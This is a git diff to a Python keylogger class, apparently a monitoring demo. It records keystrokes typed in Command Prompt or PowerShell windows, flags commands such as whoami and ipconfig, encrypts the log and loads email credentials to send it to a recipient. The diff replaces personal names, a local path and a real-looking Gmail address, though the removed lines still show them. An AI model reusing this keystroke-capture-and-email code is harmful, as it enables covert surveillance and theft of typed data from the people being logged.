@@ -22,7 +22,7 @@ class Keylogger:
         self.encrypted_file = self.output_file + ".enc"
         self.key_file = "encryption_key.key"
         self.current_word = ""
-        self.exact_strings = ['ipconfig', 'whoami', 'netuser', 'systeminfo']
+        self.exact_strings = ['List of Sensitive Strings']
         self.pasted_strings = []
         self.pasting = False
         self.current_command = ""
@@ -31,18 +31,18 @@ class Keylogger:
         self.current_keys = set()
 
         self.user_roles = {
-            'rohit': 'administrator',
-            'asus': 'accounting',
-            'prathamesh': 'networker',
-            'kunika': 'BPS',
+            'P1': 'administrator',
+            'P2': 'accounting',
+            'P3': 'networker',
+            'P4': 'BPS',
             'guest1': 'Guest'
         }
 
         self.config = configparser.ConfigParser()
-        self.config.read(os.path.join(os.path.dirname(__file__), 'C:/Users/Rohit/OneDrive/Desktop/Demo_keyLogger/config.ini'))
+        self.config.read(os.path.join(os.path.dirname(__file__), 'Path/to/config.ini'))
         self.sender_email = self.config.get('Email', 'sender_email')
         self.sender_password = self.config.get('Email', 'sender_password')
-        self.recipient_email = "khp0901@gmail.com"
+        self.recipient_email = "reciever@gmail.com"
 
         # Load or generate encryption key
         self.key = self.load_or_generate_key()
@@ -92,7 +92,7 @@ class Keylogger:
             self.unblock_user(user)
         try:
             active_window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
-            if 'Command Prompt' in active_window_title or 'PowerShell' in active_window_title:
+            if '#Name of Application to Monitor' in active_window_title or '#optional' in active_window_title:
                 current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                 user = os.getenv('USERNAME')
                 keystroke = self.get_key_str(key)
